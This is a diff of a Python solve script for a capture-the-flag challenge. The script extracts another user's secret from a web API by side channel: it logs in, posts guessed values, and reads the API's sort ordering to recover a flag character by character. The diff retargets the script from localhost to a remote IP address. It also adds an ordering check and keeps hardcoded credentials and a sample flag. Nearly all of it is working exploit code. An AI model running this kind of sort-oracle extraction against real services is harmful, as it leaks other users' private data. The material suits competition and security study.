@@ -18,8 +18,8 @@ password1 = 'neptunian20'
 username2 = 'nep2'
 password2 = 'neptunian20'
 
-host = 'http://localhost:8000'
-# host = 'http://193.57.159.27:21627'
+# host = 'http://localhost:8000'
+host = 'http://193.57.159.27:21627'
 
 ### Get create logged session
 def get_session(username, password):
@@ -51,7 +51,6 @@ def get_session(username, password):
     'password': password
     }
 
-    # response = session.post('{}/auth/login/'.format(host), cookies={'csrftoken': session.cookies['csrftoken']}, data=data)
     response = session.post('{}/auth/login/'.format(host), data=data)
 
     print('Login POST: ', response.status_code)
@@ -60,23 +59,23 @@ def get_session(username, password):
 
 ### Send Secret
 def send_secret(session, secret_value):
-    # print("=============> POST SECRET")
-    # print(secret_value)
     secret = {'value': secret_value}
     response = session.post('{}/api/secret/'.format(host), json=secret, headers={'X-CSRFToken': session.cookies['csrftoken']})
-    # print('POST /api/secret/', response.status_code)
 
     return json.loads(response.text)
 
-
 ### Get All Secrets
-def get_all_secrets(session, sec_id_filter):
-    # print("=============> GET ALL SECRETS")
-    response = session.get('{}/api/secret/?format=json&ordering=value'.format(host))
-    # print('GET /api/secret/', response.status_code)
+def get_all_secrets(session):
+    response = session.get('{}/api/secret/'.format(host))
 
     all_secrets = json.loads(response.text)
+    return all_secrets
 
+### Get All Secrets
+def get_filtered_secrets(session, sec_id_filter):
+    response = session.get('{}/api/secret/?format=json&ordering=value'.format(host))
+
+    all_secrets = json.loads(response.text)
     result = [sec['id'] for sec in all_secrets if sec['id'] in sec_id_filter]  
 
     return result
@@ -112,7 +111,7 @@ def test_char(params):
     current_ch = get_char(charpos)
 
     sec = send_secret(session, current_flag+current_ch)
-    all_secs = get_all_secrets(session, [FLAG_SEC_ID, sec['id']])
+    all_secs = get_filtered_secrets(session, [FLAG_SEC_ID, sec['id']])
 
     return all_secs.index(FLAG_SEC_ID) > all_secs.index(sec['id'])
 
@@ -142,10 +141,43 @@ def bruteFlag(session, prefix):
 
 
 if __name__ == '__main__':
-    # Sample Flag
-    s1 = get_session(username1, password1)
-    sec1 = send_secret(s1, "ractf{data_exf1l_via_s0rt1ng_0c66de47}") # before 'r'(actf{)
-    print(sec1)
 
-    brute_session = get_session(username, password)
-    bruteFlag(brute_session, FLAG_PREFIX)
+    # Setup
+    # s1 = get_session('admin2', 's0mePassword')
+    # sec1 = send_secret(s1, "ractf{s0me_fl4g}")
+    # print(sec1)
+    # for user in ['user1', 'user2', 'user3']:
+    #     su = get_session(user, 'pwdpwd12')
+    #     secu = send_secret(su, "someSecret")
+    #     print(secu)
+
+    # Neptunian secret
+    # s1 = get_session('neptunian', 'pwdpwd12')
+    # sec1 = send_secret(s1, "Not that secret")
+    # print(sec1)
+
+    # All Secrets
+    # s1 = get_session(username, password)
+    # all_secs = get_all_secrets(s1)
+    # print(json.dumps(all_secs, indent=2))
+
+    # Validate ordering
+    s1 = get_session(username1, password1)
+    secQ = send_secret(s1, "q")
+    s2 = get_session(username2, password2)
+    secS = send_secret(s2, "s")
+
+    print("ID 'Q': ", secQ['id'])
+    print("ID 'S': ", secS['id'])
+
+    all_secs = get_filtered_secrets(s1, [1, secQ['id'], secS['id']])
+    print('Ordered IDs:')
+    print(json.dumps(all_secs, indent=2))
+
+    # # Sample Flag
+    # s1 = get_session(username1, password1)
+    # sec1 = send_secret(s1, "ractf{data_exf1l_via_s0rt1ng_0c66de47}") # before 'r'(actf{)
+    # print(sec1)
+
+    # brute_session = get_session(username, password)
+    # bruteFlag(brute_session, FLAG_PREFIX)
